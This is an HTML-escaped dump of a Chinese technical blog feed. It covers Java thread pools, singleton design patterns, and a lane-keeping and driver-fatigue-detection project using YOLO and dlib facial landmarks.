&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;public boolean prestartCoreThread() {
    return addIfUnderCorePoolSize(null); //注意传进去的参数是null
}
 
public int prestartAllCoreThreads() {
    int n = 0;
    while (addIfUnderCorePoolSize(null))//注意传进去的参数是null
        ++n;
    return n;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;注意上面传进去的参数是null，根据第2小节的分析可知如果传进去的参数为null，则最后执行线程会阻塞在getTask方法中的&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;r = workQueue.take();
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;即等待任务队列中有任务&lt;/p&gt;

&lt;h2 id=&quot;任务缓存队列及排队策略&quot;&gt;&lt;strong&gt;任务缓存队列及排队策略&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;在前面我们多次提到了任务缓存队列，即workQueue，它用来存放等待执行的任务。&lt;/p&gt;

&lt;p&gt;　　workQueue的类型为BlockingQueue&lt;Runnable&gt;，通常可以取下面三种类型：&lt;/Runnable&gt;&lt;/p&gt;

&lt;p&gt;　　1）ArrayBlockingQueue：基于数组的先进先出队列，此队列创建时必须指定大小；&lt;/p&gt;

&lt;p&gt;　　2）LinkedBlockingQueue：基于链表的先进先出队列，如果创建时没有指定此队列大小，则默认为Integer.MAX_VALUE；&lt;/p&gt;

&lt;p&gt;　　3）synchronousQueue：这个队列比较特殊，它不会保存提交的任务，而是将直接新建一个线程来执行新来的任务。&lt;/p&gt;

&lt;h2 id=&quot;任务拒绝策略&quot;&gt;&lt;strong&gt;任务拒绝策略&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;当线程池的任务缓存队列已满并且线程池中的线程数目达到maximumPoolSize，如果还有任务到来就会采取任务拒绝策略，通常有以下四种策略：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;ThreadPoolExecutor.AbortPolicy:丢弃任务并抛出RejectedExecutionException异常。
ThreadPoolExecutor.DiscardPolicy：也是丢弃任务，但是不抛出异常。
ThreadPoolExecutor.DiscardOldestPolicy：丢弃队列最前面的任务，然后重新尝试执行任务（重复此过程）
ThreadPoolExecutor.CallerRunsPolicy：由调用线程处理该任务 
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;线程池的关闭&quot;&gt;&lt;strong&gt;线程池的关闭&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;hreadPoolExecutor提供了两个方法，用于线程池的关闭，分别是shutdown()和shutdownNow()，其中：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;shutdown()：不会立即终止线程池，而是要等所有任务缓存队列中的任务都执行完后才终止，但再也不会接受新的任务&lt;/li&gt;
  &lt;li&gt;shutdownNow()：立即终止线程池，并尝试打断正在执行的任务，并且清空任务缓存队列，返回尚未执行的任务&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;线程池容量的动态调整&quot;&gt;&lt;strong&gt;线程池容量的动态调整&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;hreadPoolExecutor提供了动态调整线程池容量大小的方法：setCorePoolSize()和setMaximumPoolSize()，&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;setCorePoolSize：设置核心池大小&lt;/li&gt;
  &lt;li&gt;setMaximumPoolSize：设置线程池最大能创建的线程数目大小&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;　　当上述参数从小变大时，ThreadPoolExecutor进行线程赋值，还可能立即创建新的线程来执行任务。&lt;/p&gt;

&lt;h1 id=&quot;使用示例&quot;&gt;使用示例&lt;/h1&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;public class Test {
     public static void main(String[] args) {   
         ThreadPoolExecutor executor = new ThreadPoolExecutor(5, 10, 200, TimeUnit.MILLISECONDS,
                 new ArrayBlockingQueue&amp;lt;Runnable&amp;gt;(5));
          
         for(int i=0;i&amp;lt;15;i++){
             MyTask myTask = new MyTask(i);
             executor.execute(myTask);
             System.out.println(&quot;线程池中线程数目：&quot;+executor.getPoolSize()+&quot;，队列中等待执行的任务数目：&quot;+
             executor.getQueue().size()+&quot;，已执行玩别的任务数目：&quot;+executor.getCompletedTaskCount());
         }
         executor.shutdown();
     }
}
 
 
class MyTask implements Runnable {
    private int taskNum;
     
    public MyTask(int num) {
        this.taskNum = num;
    }
     
    @Override
    public void run() {
        System.out.println(&quot;正在执行task &quot;+taskNum);
        try {
            Thread.currentThread().sleep(4000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        System.out.println(&quot;task &quot;+taskNum+&quot;执行完毕&quot;);
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;结果:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-markdown&quot;&gt;正在执行task 0
线程池中线程数目：1，队列中等待执行的任务数目：0，已执行玩别的任务数目：0
线程池中线程数目：2，队列中等待执行的任务数目：0，已执行玩别的任务数目：0
正在执行task 1
线程池中线程数目：3，队列中等待执行的任务数目：0，已执行玩别的任务数目：0
正在执行task 2
线程池中线程数目：4，队列中等待执行的任务数目：0，已执行玩别的任务数目：0
正在执行task 3
线程池中线程数目：5，队列中等待执行的任务数目：0，已执行玩别的任务数目：0
正在执行task 4
线程池中线程数目：5，队列中等待执行的任务数目：1，已执行玩别的任务数目：0
线程池中线程数目：5，队列中等待执行的任务数目：2，已执行玩别的任务数目：0
线程池中线程数目：5，队列中等待执行的任务数目：3，已执行玩别的任务数目：0
线程池中线程数目：5，队列中等待执行的任务数目：4，已执行玩别的任务数目：0
线程池中线程数目：5，队列中等待执行的任务数目：5，已执行玩别的任务数目：0
线程池中线程数目：6，队列中等待执行的任务数目：5，已执行玩别的任务数目：0
正在执行task 10
线程池中线程数目：7，队列中等待执行的任务数目：5，已执行玩别的任务数目：0
正在执行task 11
线程池中线程数目：8，队列中等待执行的任务数目：5，已执行玩别的任务数目：0
正在执行task 12
线程池中线程数目：9，队列中等待执行的任务数目：5，已执行玩别的任务数目：0
正在执行task 13
线程池中线程数目：10，队列中等待执行的任务数目：5，已执行玩别的任务数目：0
正在执行task 14
task 3执行完毕
task 0执行完毕
task 2执行完毕
task 1执行完毕
正在执行task 8
正在执行task 7
正在执行task 6
正在执行task 5
task 4执行完毕
task 10执行完毕
task 11执行完毕
task 13执行完毕
task 12执行完毕
正在执行task 9
task 14执行完毕
task 8执行完毕
task 5执行完毕
task 7执行完毕
task 6执行完毕
task 9执行完毕
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;从执行结果可以看出，当线程池中线程的数目大于5时，便将任务放入任务缓存队列里面，当任务缓存队列满了之后，便创建新的线程。如果上面程序中，将for循环中改成执行20个任务，就会抛出任务拒绝异常了。&lt;/p&gt;

&lt;p&gt;　　不过在java doc中，并不提倡我们直接使用ThreadPoolExecutor，而是使用Executors类中提供的几个静态方法来创建线程池：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;Executors.newCachedThreadPool();        //创建一个缓冲池，缓冲池容量大小为Integer.MAX_VALUE
Executors.newSingleThreadExecutor();   //创建容量为1的缓冲池
Executors.newFixedThreadPool(int);    //创建固定容量大小的缓冲池
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;下面是这三个静态方法的具体实现;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;public static ExecutorService newFixedThreadPool(int nThreads) {
    return new ThreadPoolExecutor(nThreads, nThreads,
                                  0L, TimeUnit.MILLISECONDS,
                                  new LinkedBlockingQueue&amp;lt;Runnable&amp;gt;());
}
public static ExecutorService newSingleThreadExecutor() {
    return new FinalizableDelegatedExecutorService
        (new ThreadPoolExecutor(1, 1,
                                0L, TimeUnit.MILLISECONDS,
                                new LinkedBlockingQueue&amp;lt;Runnable&amp;gt;()));
}
public static ExecutorService newCachedThreadPool() {
    return new ThreadPoolExecutor(0, Integer.MAX_VALUE,
                                  60L, TimeUnit.SECONDS,
                                  new SynchronousQueue&amp;lt;Runnable&amp;gt;());
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;从它们的具体实现来看，它们实际上也是调用了ThreadPoolExecutor，只不过参数都已配置好了。&lt;/p&gt;

&lt;p&gt;　　newFixedThreadPool创建的线程池corePoolSize和maximumPoolSize值是相等的，它使用的LinkedBlockingQueue；&lt;/p&gt;

&lt;p&gt;　　newSingleThreadExecutor将corePoolSize和maximumPoolSize都设置为1，也使用的LinkedBlockingQueue；&lt;/p&gt;

&lt;p&gt;　　newCachedThreadPool将corePoolSize设置为0，将maximumPoolSize设置为Integer.MAX_VALUE，使用的SynchronousQueue，也就是说来了任务就创建线程运行，当线程空闲超过60秒，就销毁线程。&lt;/p&gt;

&lt;p&gt;　　实际中，如果Executors提供的三个静态方法能满足要求，就尽量使用它提供的三个方法，因为自己去手动配置ThreadPoolExecutor的参数有点麻烦，要根据实际任务的类型和数量来进行配置。&lt;/p&gt;

&lt;p&gt;　　另外，如果ThreadPoolExecutor达不到要求，可以自己继承ThreadPoolExecutor类进行重写。&lt;/p&gt;

&lt;h1 id=&quot;如何合理配置线程池的大小&quot;&gt;如何合理配置线程池的大小&lt;/h1&gt;

&lt;p&gt;一般需要根据任务的类型来配置线程池大小：&lt;/p&gt;

&lt;p&gt;　　如果是CPU密集型任务，就需要尽量压榨CPU，参考值可以设为 &lt;em&gt;N&lt;/em&gt;CPU+1&lt;/p&gt;

&lt;p&gt;　　如果是IO密集型任务，参考值可以设置为2&lt;em&gt;*N&lt;/em&gt;CPU&lt;/p&gt;

&lt;p&gt;　　当然，这只是一个参考值，具体的设置还需要根据实际情况进行调整，比如可以先将线程池大小设置为参考值，再观察任务运行情况和系统负载、资源利用率来进行适当调整。&lt;/p&gt;</content><author><name></name></author><category term="JAVA" /><summary type="html">[toc]</summary></entry><entry><title type="html">设计模式</title><link href="http://localhost:4000/_posts/2020-07-01-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/" rel="alternate" type="text/html" title="设计模式" /><published>2020-07-01T00:00:00+08:00</published><updated>2020-07-01T00:00:00+08:00</updated><id>http://localhost:4000/_posts/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F</id><content type="html" xml:base="http://localhost:4000/_posts/2020-07-01-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/">&lt;p&gt;[toc]&lt;/p&gt;

&lt;h1 id=&quot;创建型模式&quot;&gt;&lt;strong&gt;创建型模式&lt;/strong&gt;&lt;/h1&gt;

&lt;h2 id=&quot;工厂方法模式&quot;&gt;工厂方法模式&lt;/h2&gt;

&lt;h2 id=&quot;抽象工厂模式&quot;&gt;抽象工厂模式&lt;/h2&gt;

&lt;h2 id=&quot;单例模式&quot;&gt;单例模式&lt;/h2&gt;

&lt;p&gt;单例模式的写法有好几种，这里主要介绍三种：懒汉式单例、饿汉式单例、登记式单例;&lt;/p&gt;

&lt;p&gt;单例模式有以下特点：
 　1、单例类只能有一个实例。
 　2、单例类必须自己创建自己的唯一实例。
 　3、单例类必须给所有其他对象提供这一实例。&lt;/p&gt;

&lt;p&gt;单例模式确保某个类只有一个实例，而且自行实例化并向整个系统提供这个实例。在计算机系统中，线程池、缓存、日志对象、对话框、打印机、显卡的驱动程序对象常被设计成单例。这些应用都或多或少具有资源管理器的功能。每台计算机可以有若干个打印机，但只能有一个Printer Spooler，以避免两个打印作业同时输出到打印机中。每台计算机可以有若干通信端口，系统应当集中管理这些通信端口，以避免一个通信端口同时被两个请求同时调用。总之，选择单例模式就是为了避免不一致状态，避免政出多头。&lt;/p&gt;

&lt;h3 id=&quot;懒汉式单例&quot;&gt;懒汉式单例&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;//懒汉式单例类.在第一次调用的时候实例化自己 
public class Singleton {
    private Singleton() {}
    private static Singleton single=null;
    //静态工厂方法 
    public static Singleton getInstance() {
         if (single == null) {  
             single = new Singleton();
         }  
        return single;
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Singleton通过将构造方法限定为private避免了类在外部被实例化，在同一个虚拟机范围内，Singleton的唯一实例只能通过getInstance()方法访问。&lt;/p&gt;

&lt;p&gt;（事实上，通过Java反射机制是能够实例化构造方法为private的类的，那基本上会使所有的Java单例实现失效。此问题在此处不做讨论，姑且掩耳盗铃地认为反射机制不存在。）&lt;/p&gt;

&lt;p&gt;但是以上懒汉式单例的实现没有考虑线程安全问题，它是线程不安全的，并发环境下很可能出现多个Singleton实例，要实现线程安全，有以下三种方式，都是对getInstance这个方法改造，保证了懒汉式单例的线程安全，如果你第一次接触单例模式，对线程安全不是很了解，可以先跳过下面这三小条，去看饿汉式单例，等看完后面再回头考虑线程安全的问题：&lt;/p&gt;

&lt;p&gt;1、在getInstance方法上加同步&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;public static synchronized Singleton getInstance() {
         if (single == null) {  
             single = new Singleton();
         }  
        return single;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;2、双重检查锁定&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;public static Singleton getInstance() {
        if (singleton == null) {  
            synchronized (Singleton.class) {  
               if (singleton == null) {  
                  singleton = new Singleton(); 
               }  
            }  
        }  
        return singleton; 
    }
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;3.静态内部类&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;public class Singleton {  
    private static class LazyHolder {  
       private static final Singleton INSTANCE = new Singleton();  
    }  
    private Singleton (){}  
    public static final Singleton getInstance() {  
       return LazyHolder.INSTANCE;  
    }  
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这种比上面1、2都好一些，既实现了线程安全，又避免了同步带来的性能影响。&lt;/p&gt;

&lt;h3 id=&quot;饿汉式单例&quot;&gt;饿汉式单例&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;//饿汉式单例类.在类初始化时，已经自行实例化 
public class Singleton1 {
    private Singleton1() {}
    private static final Singleton1 single = new Singleton1();
    //静态工厂方法 
    public static Singleton1 getInstance() {
        return single;
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;饿汉式在类创建的同时就已经创建好一个静态的对象供系统使用，以后不再改变，所以天生是线程安全的。&lt;/p&gt;

&lt;h3 id=&quot;登记式单例&quot;&gt;登记式单例&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;//类似Spring里面的方法，将类名注册，下次从里面直接获取。
public class Singleton3 {
    private static Map&amp;lt;String,Singleton3&amp;gt; map = new HashMap&amp;lt;String,Singleton3&amp;gt;();
    static{
        Singleton3 single = new Singleton3();
        map.put(single.getClass().getName(), single);
    }
    //保护的默认构造子
    protected Singleton3(){}
    //静态工厂方法,返还此类惟一的实例
    public static Singleton3 getInstance(String name) {
        if(name == null) {
            name = Singleton3.class.getName();
            System.out.println(&quot;name == null&quot;+&quot;---&amp;gt;name=&quot;+name);
        }
        if(map.get(name) == null) {
            try {
                map.put(name, (Singleton3) Class.forName(name).newInstance());
            } catch (InstantiationException e) {
                e.printStackTrace();
            } catch (IllegalAccessException e) {
                e.printStackTrace();
            } catch (ClassNotFoundException e) {
                e.printStackTrace();
            }
        }
        return map.get(name);
    }
    //一个示意性的商业方法
    public String about() {    
        return &quot;Hello, I am RegSingleton.&quot;;    
    }    
    public static void main(String[] args) {
        Singleton3 single3 = Singleton3.getInstance(null);
        System.out.println(single3.about());
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;登记式单例实际上维护了一组单例类的实例，将这些实例存放在一个Map（登记薄）中，对于已经登记过的实例，则从Map直接返回，对于没有登记的，则先登记，然后返回。&lt;/p&gt;

&lt;p&gt;这里我对登记式单例标记了可忽略，我的理解来说，首先它用的比较少，另外其实内部实现还是用的饿汉式单例，因为其中的static方法块，它的单例在类被装载的时候就被实例化了。&lt;/p&gt;

&lt;p&gt;饿汉式和懒汉式区别&lt;/p&gt;

&lt;p&gt;从名字上来说，饿汉和懒汉，&lt;/p&gt;

&lt;p&gt;饿汉就是类一旦加载，就把单例初始化完成，保证getInstance的时候，单例是已经存在的了，&lt;/p&gt;

&lt;p&gt;而懒汉比较懒，只有当调用getInstance的时候，才回去初始化这个单例。&lt;/p&gt;

&lt;p&gt;另外从以下两点再区分以下这两种方式：&lt;/p&gt;

&lt;p&gt;1、线程安全：&lt;/p&gt;

&lt;p&gt;饿汉式天生就是线程安全的，可以直接用于多线程而不会出现问题，&lt;/p&gt;

&lt;p&gt;懒汉式本身是非线程安全的，为了实现线程安全有几种写法，分别是上面的1、2、3，这三种实现在资源加载和性能方面有些区别。&lt;/p&gt;

&lt;p&gt;2、资源加载和性能：&lt;/p&gt;

&lt;p&gt;饿汉式在类创建的同时就实例化一个静态对象出来，不管之后会不会使用这个单例，都会占据一定的内存，但是相应的，在第一次调用时速度也会更快，因为其资源已经初始化完成，&lt;/p&gt;

&lt;p&gt;而懒汉式顾名思义，会延迟加载，在第一次使用该单例的时候才会实例化对象出来，第一次调用时要做初始化，如果要做的工作比较多，性能上会有些延迟，之后就和饿汉式一样了。&lt;/p&gt;

&lt;p&gt;至于1、2、3这三种实现又有些区别，&lt;/p&gt;

&lt;p&gt;第1种，在方法调用上加了同步，虽然线程安全了，但是每次都要同步，会影响性能，毕竟99%的情况下是不需要同步的，&lt;/p&gt;

&lt;p&gt;第2种，在getInstance中做了两次null检查，确保了只有第一次调用单例的时候才会做同步，这样也是线程安全的，同时避免了每次都同步的性能损耗&lt;/p&gt;

&lt;p&gt;第3种，利用了classloader的机制来保证初始化instance时只有一个线程，所以也是线程安全的，同时没有性能损耗，所以一般我倾向于使用这一种。&lt;/p&gt;

&lt;p&gt;什么是线程安全？&lt;/p&gt;

&lt;p&gt;如果你的代码所在的进程中有多个线程在同时运行，而这些线程可能会同时运行这段代码。如果每次运行结果和单线程运行的结果是一样的，而且其他的变量的值也和预期的是一样的，就是线程安全的。&lt;/p&gt;

&lt;p&gt;或者说：一个类或者程序所提供的接口对于线程来说是原子操作，或者多个线程之间的切换不会导致该接口的执行结果存在二义性,也就是说我们不用考虑同步的问题，那就是线程安全的。&lt;/p&gt;

&lt;p&gt;以下是一个单例类使用的例子，以懒汉式为例，这里为了保证线程安全，使用了双重检查锁定的方式：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;public class TestSingleton {
	String name = null;
 
        private TestSingleton() {
	}
 
	private static volatile TestSingleton instance = null;
 
	public static TestSingleton getInstance() {
           if (instance == null) {  
             synchronized (TestSingleton.class) {  
                if (instance == null) {  
                   instance = new TestSingleton(); 
                }  
             }  
           } 
           return instance;
	}
 
	public String getName() {
		return name;
	}
 
	public void setName(String name) {
		this.name = name;
	}
 
	public void printInfo() {
		System.out.println(&quot;the name is &quot; + name);
	}
 
}
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;建造者模式&quot;&gt;建造者模式&lt;/h2&gt;

&lt;h2 id=&quot;原型模式&quot;&gt;原型模式&lt;/h2&gt;

&lt;h1 id=&quot;结构型模式&quot;&gt;&lt;strong&gt;结构型模式&lt;/strong&gt;&lt;/h1&gt;

&lt;h2 id=&quot;适配器模式&quot;&gt;适配器模式&lt;/h2&gt;

&lt;h2 id=&quot;装饰者模式&quot;&gt;装饰者模式&lt;/h2&gt;

&lt;h2 id=&quot;代理模式&quot;&gt;代理模式&lt;/h2&gt;

&lt;h2 id=&quot;外观模式&quot;&gt;外观模式&lt;/h2&gt;

&lt;h2 id=&quot;桥接模式&quot;&gt;桥接模式&lt;/h2&gt;

&lt;h2 id=&quot;组合模式&quot;&gt;组合模式&lt;/h2&gt;

&lt;h2 id=&quot;享元模式&quot;&gt;享元模式&lt;/h2&gt;

&lt;h1 id=&quot;行为型模式&quot;&gt;&lt;strong&gt;行为型模式&lt;/strong&gt;&lt;/h1&gt;

&lt;h2 id=&quot;策略模式&quot;&gt;策略模式&lt;/h2&gt;

&lt;h2 id=&quot;模板模式&quot;&gt;模板模式&lt;/h2&gt;

&lt;h2 id=&quot;观察者模式&quot;&gt;观察者模式&lt;/h2&gt;

&lt;h2 id=&quot;迭代模式&quot;&gt;迭代模式&lt;/h2&gt;

&lt;h2 id=&quot;责任链模式&quot;&gt;责任链模式&lt;/h2&gt;

&lt;h2 id=&quot;命令模式&quot;&gt;命令模式&lt;/h2&gt;

&lt;h2 id=&quot;备忘录模式&quot;&gt;备忘录模式&lt;/h2&gt;

&lt;h2 id=&quot;状态模式&quot;&gt;状态模式&lt;/h2&gt;

&lt;h2 id=&quot;访问者模式&quot;&gt;访问者模式&lt;/h2&gt;

&lt;h2 id=&quot;中介模式&quot;&gt;中介模式&lt;/h2&gt;

&lt;h2 id=&quot;解释器模式&quot;&gt;解释器模式&lt;/h2&gt;

&lt;h1 id=&quot;补充&quot;&gt;补充&lt;/h1&gt;

&lt;h3 id=&quot;并发型模式&quot;&gt;并发型模式&lt;/h3&gt;

&lt;h2 id=&quot;线程池模式&quot;&gt;线程池模式&lt;/h2&gt;</content><author><name></name></author><category term="JAVA" /><summary type="html">[toc]</summary></entry><entry><title type="html">车道保持&amp;amp;疲劳驾驶检测</title><link href="http://localhost:4000/_posts/2020-07-01-%E8%BD%A6%E9%81%93%E4%BF%9D%E6%8C%81&%E7%96%B2%E5%8A%B3%E9%A9%BE%E9%A9%B6%E6%A3%80%E6%B5%8B/" rel="alternate" type="text/html" title="车道保持&amp;疲劳驾驶检测" /><published>2020-07-01T00:00:00+08:00</published><updated>2020-07-01T00:00:00+08:00</updated><id>http://localhost:4000/_posts/%E8%BD%A6%E9%81%93%E4%BF%9D%E6%8C%81&amp;%E7%96%B2%E5%8A%B3%E9%A9%BE%E9%A9%B6%E6%A3%80%E6%B5%8B</id><content type="html" xml:base="http://localhost:4000/_posts/2020-07-01-%E8%BD%A6%E9%81%93%E4%BF%9D%E6%8C%81&amp;%E7%96%B2%E5%8A%B3%E9%A9%BE%E9%A9%B6%E6%A3%80%E6%B5%8B/">&lt;p&gt;[toc]&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/verylazycat/DriverAssistanceSystem&quot;&gt;github&lt;/a&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;有问题可私信我&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&quot;功能模块&quot;&gt;功能模块&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;车道保持
    &lt;ul&gt;
      &lt;li&gt;车道线识别&lt;/li&gt;
      &lt;li&gt;航向判断&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;驾驶员行为及状态检测
    &lt;ul&gt;
      &lt;li&gt;疲劳检测&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;车道线车况识别总体流程图&quot;&gt;车道线&amp;amp;车况识别总体流程图&lt;/h1&gt;

&lt;h1&gt;&lt;img src=&quot;/img/detect.png&quot; alt=&quot;detect&quot; /&gt;&lt;/h1&gt;

&lt;p&gt;对输入的每一帧图像主要有如下处理：&lt;/p&gt;

&lt;p&gt;1.车道线识别：
	1.1.降噪
	1.2.边缘检测
	1.3.ROI处理
	1.4.霍夫线获取
	1.5.路线获取
	1.6.渲染&lt;/p&gt;

&lt;p&gt;2.车况识别：
	2.1.加载yolo网络
	2.2.前向传播
	3.3.渲染&lt;/p&gt;

&lt;h1 id=&quot;车道线识别主要操作&quot;&gt;车道线识别主要操作&lt;/h1&gt;

&lt;h1 id=&quot;-1&quot;&gt;&lt;img src=&quot;/img/车道线处理.png&quot; alt=&quot;车道线处理&quot; /&gt;&lt;/h1&gt;

&lt;h1 id=&quot;方向判断逻辑&quot;&gt;方向判断逻辑&lt;/h1&gt;

&lt;h1 id=&quot;-2&quot;&gt;&lt;img src=&quot;/img/方向判断.png&quot; alt=&quot;方向判断&quot; /&gt;&lt;/h1&gt;

&lt;p&gt;获得道路线后，即我们获取了两个方程:
&lt;script type=&quot;math/tex&quot;&gt;y1 = a1x1 + b1\\
y2 = a2x2 + b2&lt;/script&gt;
计算两直线交点(x0,y0),即左图所提的消失点；
此外，我们已知图像水平方向中心直线：x；&lt;/p&gt;

&lt;p&gt;由此，我们有如下判断依据：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;x0 &amp;gt; x + thr_vp :右转&lt;/li&gt;
  &lt;li&gt;x0 &amp;lt; x - thr_vp:左转&lt;/li&gt;
  &lt;li&gt;x0 &amp;gt;= (x - thr_vp) &amp;amp;&amp;amp; x0 &amp;lt;= (x + thr_vp)：直线&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;注：thr_vp为调整参数，根据实际情况调试&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&quot;车况识别&quot;&gt;车况识别&lt;/h1&gt;

&lt;p&gt;基于深度学习的目标检测与识别算法大致分为以下三大类:
1.基于区域建议的目标检测与识别算法，如R-CNN, Fast-R-CNN, Faster-R-CNN;
2.基于回归的目标检测与识别算法，如YOLO, SSD;
3.基于搜索的目标检测与识别算法，如基于视觉注意的AttentionNet；&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;此处识别采用YOLO算法,其优点如下：
1.速度非常快。在Titan X GPU上的速度是45 fps，加速版的YOLO差不多是150fps；
2.YOLO是基于图像的全局信息进行预测的；
3.泛化能力强；
4.准确率高；&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;具体算法参考yolo论文&lt;/li&gt;
  &lt;li&gt;训练参考&lt;a href=&quot;https://pjreddie.com/darknet/yolo/&quot;&gt;DarkNet&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;注：由于笔记本计算能力有限，此处采用开源coco数据集训练的yolo模型，支持80个分类识别，具体分类参考配置文件&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;快速体验yolo&quot;&gt;快速体验yolo&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;安装&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;git clone https://github.com/pjreddie/darknet.git
cd darknet
make
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;输出如下内容即安装成功&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;mkdir -p obj
gcc -I/usr/local/cuda/include/ -Wall -Wfatal-errors -Ofast....
gcc -I/usr/local/cuda/include/ -Wall -Wfatal-errors -Ofast....
gcc -I/usr/local/cuda/include/ -Wall -Wfatal-errors -Ofast....
.....
gcc -I/usr/local/cuda/include/ -Wall -Wfatal-errors -Ofast -lm....
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
  &lt;p&gt;注意:根据自己环境调整 Makefile ,尤其是 GPU , CUDNN , OPENCV&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;下载weights文件&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;wget https://pjreddie.com/media/files/yolov .weights
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;测试&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;./darknet detect cfg/yolov .cfg yolov .weights data/dog.jpg
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&quot;驾驶员行为及状态检测&quot;&gt;驾驶员行为及状态检测&lt;/h1&gt;

&lt;h1 id=&quot;-3&quot;&gt;&lt;img src=&quot;/img/驾驶员行为及状态检测.png&quot; alt=&quot;驾驶员行为及状态检测&quot; /&gt;&lt;/h1&gt;

&lt;p&gt;关键操作有如下：&lt;/p&gt;

&lt;p&gt;1.保存驾驶人员启动程序时的状态数据&lt;/p&gt;

&lt;p&gt;2.判断是否无人驾驶&lt;/p&gt;

&lt;p&gt;3.依据记录的状态数据判断当前技术人员状态是否异常&lt;/p&gt;

&lt;h1 id=&quot;状态特征判断依据&quot;&gt;状态特征判断依据&lt;/h1&gt;

&lt;p&gt;有如下内容需要了解:&lt;/p&gt;

&lt;p&gt;1.“眼睛纵横比”（EAR）
我们可以应用面部标志检测来定位脸部的重要区域，包括眼睛，眉毛，鼻子，耳朵和嘴巴&lt;/p&gt;

&lt;p&gt;2.EAR计算公式
&lt;script type=&quot;math/tex&quot;&gt;EAR = (||p_{2} - p_{6}||+||p_{3}-p_{5}||)/(2||p_{1} -p_{4}||)&lt;/script&gt;
&lt;img src=&quot;/img/eyeEar.png&quot; alt=&quot;eyeEar&quot; /&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;详细内容参考Soukupová和Čech在其2016年的论文Real-Time Eye Blink Detection using Facial Landmarks&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;landmark算法&quot;&gt;Landmark算法&lt;/h2&gt;

&lt;p&gt;点标记》一文中有效果和标定点序号的示意图。今后可采用landmark中的点提取眼睛区域、嘴巴区
域用于疲劳检测,提取鼻子等部分可用于3D姿态估计。
Dlib库使用《One Millisecond Face Alignment with an Ensemble of Regression Trees》CVPR2014
中提及的算法:ERT(ensemble of regression trees)级联回归,即基于梯度提高学习的回归树方法。
该算法使用级联回归因子,首先需要使用一系列标定好的人脸图片作为训练集,然后会生成一个模型。
使用基于特征选择的相关性方法把目标输出投影到一个随机方向w上,并且选择一对特征(u,v),使
得Ii(u )-Ii(v )与被投影的目标wTri在训练数据上拥有最高的样本相关性。
